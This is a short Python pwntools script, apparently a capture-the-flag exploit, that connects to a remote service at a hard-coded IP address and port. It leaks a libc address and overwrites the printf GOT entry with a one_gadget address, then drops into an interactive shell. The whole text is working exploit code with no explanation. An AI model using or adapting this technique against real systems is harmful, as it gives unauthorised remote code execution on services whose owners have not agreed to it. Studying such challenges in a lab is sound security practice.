from pwn import *

host = '35.194.194.168'
port = 6666
r = remote(host, port)

r.recvuntil(':')
printf = 0x600bb8
r.sendline(str(printf).encode())

r.recvuntil('=')
libc = int(r.recvuntil('\n'), 16) - 0x55800
print('libc =', hex(libc))

one_gadget = libc + 0x45216
print('one_gadget =', hex(one_gadget))
r.recvuntil(':')
r.sendline(str(one_gadget).encode())

r.interactive()
